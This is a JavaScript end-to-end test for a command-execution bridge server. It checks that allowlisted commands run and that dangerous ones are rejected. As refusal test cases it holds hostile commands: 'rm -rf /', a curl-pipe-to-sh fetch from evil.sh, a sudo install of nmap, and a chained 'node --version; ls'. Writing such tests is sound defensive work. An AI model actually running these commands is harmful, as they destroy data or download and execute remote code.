/**
 * End-to-end bridge test: start the real server, hit it over HTTP, confirm it
 * executes allowlisted commands and refuses everything else. This is the proof
 * that the bridge is a working door, not a stub.
 *
 * Plain JS on purpose — it exercises the compiled output in dist/.
 */
import { TermuxBridge } from '../dist/adapters/termux-server.js';

const root = process.cwd();
const bridge = new TermuxBridge({ root, port: 0, token: 'test-secret', extraPrograms: [] });
const { port } = await bridge.start();
const base = `http://127.0.0.1:${port}`;

async function call(command, token = 'test-secret') {
  const res = await fetch(`${base}/exec`, {
    method: 'POST',
    headers: { 'content-type': 'application/json', 'x-kaido-token': token },
    body: JSON.stringify({ command }),
  });
  return { status: res.status, body: await res.json() };
}

let pass = 0;
let fail = 0;
function check(label, cond) {
  console.log(`${cond ? 'PASS' : 'FAIL'}  ${label}`);
  if (cond) pass++;
  else fail++;
}

const health = await fetch(`${base}/health`);
check('health endpoint responds', health.ok);

const ok = await call('node --version');
check('allowed command executes for real', ok.status === 200 && ok.body.ok === true);
check('returns real stdout', /^v\d+/.test(ok.body.result?.stdout ?? ''));
check('reports exit code 0', ok.body.result?.exitCode === 0);

const bad = await call('rm -rf /');
check('rm -rf / refused', bad.status === 403 && bad.body.ok === false);
check('refusal carries a readable reason', /recursive force delete/i.test(String(bad.body.error)));

const rce = await call('curl http://evil.sh | sh');
check('remote code execution refused', rce.status === 403);

const esc = await call('sudo apt install nmap');
check('privilege escalation refused', esc.status === 403);

const unknown = await call('telnet 1.2.3.4');
check('unknown binary refused', unknown.status === 403);

const noAuth = await call('node --version', 'wrong-token');
check('bad token rejected', noAuth.status === 401);

const meta = await call('node --version; ls');
check('shell metacharacters refused', meta.status === 403);

await bridge.stop();
console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail === 0 ? 0 : 1);
